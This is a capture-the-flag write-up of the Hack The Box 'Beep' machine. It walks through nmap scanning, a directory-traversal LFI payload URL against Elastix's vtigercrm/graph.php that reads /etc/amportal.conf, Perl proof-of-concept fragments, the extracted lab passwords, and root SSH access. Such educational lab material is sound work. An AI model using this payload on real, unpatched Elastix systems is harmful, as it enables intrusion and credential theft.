# Hack The Box - Beep Writeup

> A complete walkthrough of the **Beep** machine from Hack The Box, covering extensive service enumeration, Elastix discovery, Local File Inclusion, credential extraction, legacy SSH configuration, and direct root access.

---

## Machine Information

| Platform     | Machine | Difficulty | OS    |
| ------------ | ------- | ---------- | ----- |
| Hack The Box | Beep    | Easy       | Linux |

---

# 📌 Overview

**Beep** is an Easy Linux machine from Hack The Box with a large attack surface and several legacy services.

The machine exposes multiple services, including:

* SSH
* SMTP
* HTTP / HTTPS
* POP3 / IMAP
* MySQL
* Webmin

During enumeration, the web application was identified as **Elastix**, an open-source unified communications platform. Further investigation revealed an old version of FreePBX and Elastix vulnerable to a Local File Inclusion vulnerability.

The LFI vulnerability allowed sensitive configuration files to be read, exposing reusable credentials. Those credentials could then be used to authenticate to SSH as the `root` user.

The complete attack path was:

```text
Service Enumeration
        ↓
Elastix Discovery
        ↓
FreePBX Version Enumeration
        ↓
Local File Inclusion
        ↓
Credential Extraction
        ↓
Legacy SSH Configuration
        ↓
Root Authentication
        ↓
Full System Compromise
```

---

# 🗂️ Table of Contents

* [Reconnaissance](#-reconnaissance)
* [Full Port Scan](#-full-port-scan)
* [Service Enumeration](#-service-enumeration)
* [Web Enumeration](#-web-enumeration)
* [Elastix Discovery](#-elastix-discovery)
* [FreePBX Enumeration](#-freepbx-enumeration)
* [Local File Inclusion](#-local-file-inclusion)
* [Credential Extraction](#-credential-extraction)
* [SSH Configuration](#-ssh-configuration)
* [Initial Access](#-initial-access)
* [Flag Capture](#-flag-capture)
* [Attack Path Summary](#-attack-path-summary)
* [Key Takeaways](#-key-takeaways)

---

# 🔍 Reconnaissance

The target IP address provided was:

```text
10.129.229.183
```

---

# 🔎 Full Port Scan

Starting with an all-port scan to identify the exposed services.

```bash
nmap -p- --min-rate 5000 10.129.229.183
```

### Results

```text
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt
```

The machine exposes a significantly larger attack surface compared to many Easy machines.

| Port  | Service |
| ----- | ------- |
| 22    | SSH     |
| 25    | SMTP    |
| 80    | HTTP    |
| 110   | POP3    |
| 111   | RPCBind |
| 143   | IMAP    |
| 443   | HTTPS   |
| 993   | IMAPS   |
| 995   | POP3S   |
| 3306  | MySQL   |
| 4445  | Unknown |
| 10000 | Webmin  |

With so many services available, proper enumeration becomes especially important.

---

# 🔬 Service Enumeration

A detailed service and version detection scan was performed.

```bash
nmap -sC -sV -p22,25,80,110,111,143,443,993,995,3306,4445,10000 10.129.229.183
```

### Important Results

```text
22/tcp    open  ssh
OpenSSH 4.3

80/tcp    open  http
Apache httpd 2.2.3 (CentOS)

443/tcp   open  ssl/https

10000/tcp open  http
MiniServ 1.570 (Webmin httpd)
```

Several services immediately stood out due to their age.

Particularly interesting versions included:

```text
OpenSSH 4.3
Apache 2.2.3
Webmin MiniServ 1.570
```

The SSL certificate was also outdated and self-signed, further suggesting that the machine was running legacy software.

---

# 🌐 Web Enumeration

Since HTTP was exposed, the web application was the next primary attack surface.

Navigating to:

```text
http://10.129.229.183
```

redirected to the HTTPS version of the application.

The website presented an **Elastix login page**.

Elastix is an open-source unified communications server that integrates multiple services such as:

* Asterisk
* FreePBX
* Webmail
* CRM functionality

---

# 📂 Directory Enumeration

Directory and file enumeration was performed against the web server.

Several directories were discovered:

```text
/admin
/help
/config
/images
/lang
/libs
/mail
/modules
/panel
/robots.txt
/static
/themes
/var
```

The `/admin` directory appeared particularly interesting.

---

# 🔍 Elastix Discovery

Further enumeration of the Elastix application revealed administrative functionality.

Navigating to:

```text
https://10.129.229.183/admin/config.php
```

resulted in an unauthorized response.

However, the page exposed useful version information.

The identified FreePBX version was:

```text
FreePBX 2.8.1.4
```

This confirmed that the target was running an old version of the PBX management software.

At this stage, the combination of:

```text
Elastix 2.2.0
+
FreePBX 2.8.1.4
+
Legacy Web Stack
```

became the primary focus.

---

# 💥 Local File Inclusion

Researching the identified Elastix version revealed a Local File Inclusion vulnerability.

The vulnerability affects the `graph.php` functionality within the `vtigercrm` directory.

The vulnerable parameter was:

```text
current_language
```

The target endpoint followed this structure:

```text
https://TARGET/vtigercrm/graph.php
```

The vulnerable parameter could be manipulated using directory traversal sequences.

---

## LFI Exploit Structure

The exploit targeted:

```text
/vtigercrm/graph.php
```

Using the following parameter:

```text
current_language
```

The directory traversal payload was designed to reach sensitive configuration files.

The target file was:

```text
/etc/amportal.conf
```

The request structure was:

```text
https://TARGET/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```

The null byte was used to terminate the file extension handling present in the vulnerable application.

---

# 🛠️ Exploit Script

A Perl proof-of-concept was used to exploit the Local File Inclusion vulnerability.

The script was configured to support the legacy SSL/TLS configuration used by the target.

Important SSL options included:

```perl
verify_hostname => 0
SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE
SSL_cipher_list => 'DEFAULT@SECLEVEL=0'
```

The target URL was constructed as:

```perl
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";
```

The script then sent a request to the vulnerable endpoint and checked the response for sensitive configuration values.

---

# 🔓 Credential Extraction

The Local File Inclusion vulnerability successfully allowed the contents of:

```text
/etc/amportal.conf
```

to be retrieved.

The following credentials were extracted:

| Service  | Username       | Password       |
| -------- | -------------- | -------------- |
| Database | `asteriskuser` | `jEhdIekWmdjE` |
| Manager  | `admin`        | `jEhdIekWmdjE` |

The extracted configuration contained:

```text
Database User: asteriskuser
Database Password: jEhdIekWmdjE

Manager User: admin
Manager Password: jEhdIekWmdjE
```

An important observation was that the same password was reused across multiple services.

This represents a critical security issue because compromising one service credential can potentially lead to access across the entire infrastructure.

---

# 🔐 SSH Configuration

The target was running a very old version of OpenSSH:

```text
OpenSSH 4.3
```

Modern SSH clients may reject the legacy cryptographic algorithms used by the server.

To support the older SSH configuration, the following settings were added to the SSH configuration file:

```text
Host 10.129.229.183
    KexAlgorithms +diffie-hellman-group14-sha1
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```

This allowed the modern SSH client to communicate with the legacy SSH service.

---

# 🐚 Initial Access

The credentials extracted from the Elastix configuration were tested against the available services.

Due to password reuse and insecure service configuration, the credentials were accepted for privileged SSH access.

A connection was established:

```bash
ssh root@10.129.229.183
```

After authentication, we were logged in directly as:

```text
root
```

Checking the current directory:

```bash
ls
```

Output:

```text
anaconda-ks.cfg
elastix-pr-2.2-1.i386.rpm
install.log
install.log.syslog
postnochroot
root.txt
webmin-1.570-1.noarch.rpm
```

We had successfully obtained full administrative access to the system.

---

# 👑 Root Flag

Since access was obtained directly as root, the root flag could be read immediately.

```bash
cat root.txt
```

---

# 🚩 User Flag

The user flag was located in the home directory of the user `fanis`.

```bash
cat /home/fanis/user.txt
```

Both flags were successfully captured.

---

# 🗺️ Attack Path Summary

```text
┌───────────────────────────────┐
│         Nmap Scan             │
│                               │
│ Multiple Services Exposed     │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│       Web Enumeration         │
│                               │
│       Elastix Platform        │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│      Version Enumeration      │
│                               │
│       FreePBX 2.8.1.4         │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│    Elastix LFI Vulnerability  │
│                               │
│    vtigercrm/graph.php        │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│   Read /etc/amportal.conf     │
│                               │
│   Extract Service Credentials │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│       Password Reuse          │
│                               │
│    Credentials Valid on SSH   │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│        SSH as Root            │
│                               │
│      Full System Access       │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│       user.txt + root.txt     │
└───────────────────────────────┘
```

---

# 🔗 Complete Attack Chain

```text
Nmap Enumeration
       │
       ▼
Multiple Open Services
       │
       ▼
HTTP / HTTPS Enumeration
       │
       ▼
Elastix Login Portal
       │
       ▼
FreePBX Version Discovery
       │
       ▼
Elastix LFI
       │
       ▼
Read amportal.conf
       │
       ▼
Extract Credentials
       │
       ▼
Password Reuse
       │
       ▼
Legacy SSH Access
       │
       ▼
ROOT
```

---

# 🧠 Key Takeaways

## 🔹 Large Attack Surfaces Require Prioritization

The machine exposed numerous services:

```text
SSH
SMTP
HTTP
HTTPS
POP3
IMAP
MySQL
Webmin
RPC
```

It would be inefficient to attack everything blindly.

Service enumeration and version identification helped prioritize the most promising attack surfaces.

---

## 🔹 Legacy Software Is Extremely Dangerous

Several outdated components were identified:

```text
OpenSSH 4.3
Apache 2.2.3
Elastix 2.2.0
FreePBX 2.8.1.4
Webmin 1.570
```

Older software versions are not automatically vulnerable, but they should always be investigated carefully.

Version enumeration is therefore a critical part of penetration testing.

---

## 🔹 Local File Inclusion Can Expose More Than Files

The LFI vulnerability allowed access to:

```text
/etc/amportal.conf
```

Configuration files often contain highly sensitive information such as:

* Database credentials
* API keys
* Service accounts
* Internal paths
* Administrative passwords

A file read vulnerability can therefore become an initial foothold or lead to complete system compromise.

---

## 🔹 Password Reuse Is a Critical Security Risk

The credentials extracted from the configuration file used the same password:

```text
jEhdIekWmdjE
```

Password reuse allowed credentials from one application to potentially be tested against other exposed services.

This demonstrates an important penetration testing principle:

> **Always test discovered credentials against other relevant services within the authorized target environment.**

---

## 🔹 Legacy Cryptography Can Create Operational Challenges

The target used older SSH cryptographic algorithms.

Modern clients may reject these algorithms by default.

The required compatibility configuration included:

```text
KexAlgorithms +diffie-hellman-group14-sha1
HostKeyAlgorithms +ssh-rsa
PubkeyAcceptedAlgorithms +ssh-rsa
```

When working with older systems, compatibility issues can sometimes prevent successful authentication even when valid credentials are available.

---

# 🛠️ Tools Used

```text
Nmap
Directory Fuzzing Tools
Web Browser
Perl
LWP::UserAgent
IO::Socket::SSL
SSH
Linux Enumeration Commands
```

---

# 📚 Vulnerabilities and Misconfigurations

| Finding                    | Component            | Impact                           |
| -------------------------- | -------------------- | -------------------------------- |
| Local File Inclusion       | Elastix 2.2.0        | Arbitrary File Read              |
| Exposed Credentials        | `/etc/amportal.conf` | Credential Disclosure            |
| Password Reuse             | Multiple Services    | Service Compromise               |
| Legacy SSH Configuration   | OpenSSH 4.3          | Weak Cryptographic Compatibility |
| Direct Root Authentication | SSH                  | Full System Compromise           |

---

# 🎯 Lessons Learned

The Beep machine demonstrates how several weaknesses can be chained together.

```text
Legacy Application
        +
File Inclusion
        +
Credential Exposure
        +
Password Reuse
        +
Root SSH Access
        =
Complete System Compromise
```

The machine reinforces several important penetration testing principles:

1. Enumerate every exposed service.
2. Identify software versions accurately.
3. Investigate legacy applications.
4. Look for publicly known vulnerabilities.
5. Configuration files can contain sensitive credentials.
6. Always check whether discovered credentials are reused.
7. Understand compatibility issues when interacting with legacy systems.
8. A simple misconfiguration can turn a low-impact vulnerability into full compromise.

---

# 🏁 Final Notes

Hack The Box **Beep** is an excellent machine for understanding the importance of thorough enumeration.

The machine presents a large number of exposed services, but the successful attack path starts with identifying the right application and investigating its version.

The complete path was:

```text
Service Enumeration
        ↓
Elastix Discovery
        ↓
LFI Vulnerability
        ↓
Configuration File Read
        ↓
Credential Extraction
        ↓
Password Reuse
        ↓
SSH Root Access
```

The most important lesson from this machine is:

> **One vulnerability may not compromise a system by itself, but when combined with poor credential management and legacy infrastructure, the impact can become critical.**

---

## ⚠️ Disclaimer

This writeup is created strictly for educational purposes and documents techniques performed against the intentionally vulnerable **Hack The Box Beep** machine in an authorized laboratory environment.

Do not attempt these techniques against systems without explicit authorization.

---

<p align="center">
  <b>Happy Hacking!</b>
</p>
